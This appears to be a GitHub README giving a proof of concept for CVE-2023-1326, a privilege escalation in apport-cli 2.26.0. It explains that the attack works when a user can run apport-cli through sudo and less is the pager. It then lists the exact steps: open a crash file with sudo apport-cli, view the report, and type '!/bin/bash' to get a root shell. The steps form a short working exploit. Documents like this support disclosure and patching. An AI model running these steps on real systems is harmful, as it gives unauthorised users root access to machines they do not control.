# CVE-2023-1326-PoC
A proof of concept for CVE-2023–1326 in apport-cli 2.26.0

This vulnerability is privilege escalation in apport-cli 2.26.0, similar to CVE-2023–26604, this vulnerability only works if assign in sudoers:

![image](https://github.com/diego-tella/CVE-2023-1326-PoC/assets/70545257/983d4307-e3af-46db-8d76-5e3970f10225)

A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege.

# PoC
```
sudo /usr/bin/apport-cli -c /var/crash/some_crash_file.crash
press V (view report)
!/bin/bash
```
![image](https://github.com/diego-tella/CVE-2023-1326-PoC/assets/70545257/aa702438-28fe-434c-9ea5-6ed760f956bb)
![image](https://github.com/diego-tella/CVE-2023-1326-PoC/assets/70545257/fa2d0491-35be-465f-8e7b-35024faf8dcf)
